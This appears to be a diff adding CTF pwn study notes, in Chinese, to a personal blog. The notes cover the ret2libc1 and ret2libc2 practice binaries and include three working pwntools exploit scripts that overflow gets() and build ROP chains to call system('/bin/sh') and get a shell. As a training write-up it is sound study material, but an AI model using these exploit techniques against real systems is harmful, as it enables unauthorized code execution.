@@ -633,6 +633,44 @@
 
 <p>最后测试结果，只有pop_edx_ecx_ebx_ret可以getshell，有点奇怪</p>
 <p><img src="/../images/basic-pwn.assets/image-20231117032438162.png" alt="image-20231117032438162"></p>
+<h3 id="ret2lib1"><a href="#ret2lib1" class="headerlink" title="ret2lib1"></a>ret2lib1</h3><p>惯例反汇编加checksec检查</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120194053493.png" alt="image-20231120194053493"></p>
+<p><img src="/../images/basic-pwn.assets/image-20231120194107395.png" alt="image-20231120194107395"></p>
+<p>其中，<code>gets()</code>函数存在栈溢出</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120194950730.png" alt="image-20231120194950730"></p>
+<p>本题情况较好，经过IDA查找，发现即既调用有<code>system()</code>函数，又有<code>/bin/sh</code>的字符串，因此可以直接组合两段地址，构造exp</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120200129820.png" alt="image-20231120200129820"></p>
+<p><img src="/../images/basic-pwn.assets/image-20231120200147555.png" alt="image-20231120200147555"></p>
+<p><img src="/../images/basic-pwn.assets/image-20231120200214634.png" alt="image-20231120200214634"></p>
+<p>本题与前面不同点在于，调用的<code>system()</code>函数，不是自己写的，而是libc中加载的函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08048460</span></span><br><span class="line">sh_addr=<span class="number">0x08048720</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">b&quot;A&quot;</span>*<span class="number">112</span>,sys_addr,<span class="string">b&quot;A&quot;</span>*<span class="number">4</span>,sh_addr])</span><br><span class="line"><span class="comment">#payload=b&quot;A&quot;*112+p32(sys_addr)+b&quot;A&quot;*4+p32(sh_addr)</span></span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>sys_addr</code>后面加的<code>b&quot;A&quot;*4</code>为填位的返回地址，具体结构参见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27339191">链接</a>。上下两种payload均可。</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120201811333.png" alt="image-20231120201811333"></p>
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><code>checksec()</code>和IDA发现，本题和上一题大差不差，但是没有<code>/bin/sh</code>字符串，有<code>system()</code>函数。</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120205835956.png" alt="image-20231120205835956"></p>
+<p>查看主函数，仍然是<code>gets()</code>函数栈溢出，</p>
+<p><img src="/../images/basic-pwn.assets/image-20231120210145342.png" alt="image-20231120210145342"></p>
+<p>可以考虑覆盖返回地址，再次调用<code>gets()</code>函数，写入<code>/bin/sh</code>的字符串到指定位置（这里选择的是.bss段的buf2中），然后再从buf2上加载该字符串，作为<code>system()</code>函数的参数。</p>
+<p>这一块儿需要构造两个ROP，其中gets()函数怎么控制返回地址写入buf2中有点迷糊。具体来说，需要构造如下图样式的链条</p>
+<p><img src="/../images/basic-pwn.assets/image-20231121022558779.png" alt="image-20231121022558779"></p>
+<p>gets()函数在plt中的相对地址已有，可以在IDA中查询或直接在gdb中<code>disass gets</code>，同理system()函数</p>
+<p><img src="/../images/basic-pwn.assets/image-20231121022818742.png" alt="image-20231121022818742"></p>
+<p>.bss段中buf2的地址为<code>0x0804A080</code></p>
+<p><img src="/../images/basic-pwn.assets/image-20231121022935230.png" alt="image-20231121022935230"></p>
+<p>gets的返回地址的gadget为<code>0x0804843d</code></p>
+<p><img src="/../images/basic-pwn.assets/image-20231121023245997.png" alt="image-20231121023245997"></p>
+<p>构造exp为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">proc.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上述的<code>0xdeadbeef</code>是magic number，该处返回地址无意义，填充跳过</p>
+<p><img src="/../images/basic-pwn.assets/image-20231121023609785.png" alt="image-20231121023609785"></p>
+<p>最后getshell。</p>
+<p>&#x3D;&#x3D;补充&#x3D;&#x3D;，之前对buf2返回地址要找一个<code>pop ebx; ret</code>的gadget有点迷，后来看了一下。在gets()函数被执行之后，main()的返回地址（被替换成了gets()的地址）以及gets()的返回地址会被<code>RET</code>指令弹出，但是gets()的参数还留在栈顶，需要清除掉后再放入system()的返回地址和参数（system的地址就是gets()的返回地址）。理论上的方案是现在代码段中找到<code>POP</code>指令插入到gets()和system()之间，因此插入上述的gadget，但是实际上system()不在乎返回地址，可以直接影响就干脆直接返回system()函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>system_plt</code>也作为<code>gets()</code>函数的返回地址，第一个buf2是gets()函数写入的地址，第二个buf2是system()函数的参数，很精妙，也能getshell。</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>与前两个差不多，但是该题将system()函数调用也隐去</p>
 
     
 
